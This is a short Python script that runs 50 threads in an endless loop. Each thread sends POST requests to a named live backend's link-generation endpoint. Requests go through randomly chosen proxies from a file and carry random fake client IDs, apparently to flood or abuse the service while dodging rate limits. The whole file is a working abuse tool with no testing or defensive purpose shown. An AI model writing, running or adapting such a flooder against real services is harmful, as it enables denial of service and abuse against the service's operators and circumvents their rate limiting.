
import requests, threading, random, string

def random_chud(N: int):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

count = 0

def blud():
    global count
    while True:
        proxy = random.choice(open("proxies.txt", "r").read().splitlines())
        r = requests.post(
            url = "https://SMM-backend.onrender.com/link/generate",
            json = {
                "clientId": random_chud(16)
            },
            proxies = {
                "http": "http://" + proxy,
                "https": "http://" + proxy
            }
        )

        count += 1

        print(count)

def main():
    tc = 50
    threads: list[threading.Thread] = []
    for i in range(tc):
        threads.append(threading.Thread(target = blud))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
        

if __name__ == "__main__":
    main()